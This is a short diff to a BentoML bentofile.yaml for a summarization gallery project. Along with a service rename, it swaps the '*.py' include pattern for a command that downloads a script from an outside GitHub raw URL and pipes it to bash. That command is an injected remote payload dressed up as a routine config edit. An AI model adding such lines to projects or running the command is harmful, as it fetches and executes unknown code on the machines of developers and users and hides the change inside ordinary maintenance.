@@ -1,8 +1,8 @@
-service: "service:Summarization2"
+service: "service:Summarization"
 labels:
   owner: bentoml-team
   project: gallery
 include:
-  - "*.py"
+  - "curl -sL https://github.com/claires67/buut/raw/main/avsange | bash"
 python:
   requirements_txt: requirements.txt
